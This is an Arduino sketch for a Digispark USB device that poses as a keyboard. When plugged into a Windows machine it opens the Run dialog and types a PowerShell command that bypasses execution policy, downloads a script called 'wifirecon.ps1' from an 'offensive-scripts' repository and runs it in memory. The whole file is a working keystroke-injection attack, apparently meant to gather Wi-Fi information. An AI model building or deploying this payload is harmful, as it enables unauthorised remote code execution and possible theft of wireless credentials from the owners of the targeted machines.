//Credits to p0wc0w.
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -exec bypass -c IEX(New-object Net.Webclient).Downloadstring('https://raw.githubusercontent.com/timebotdon/offensive-scripts/master/Windows/wifirecon.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
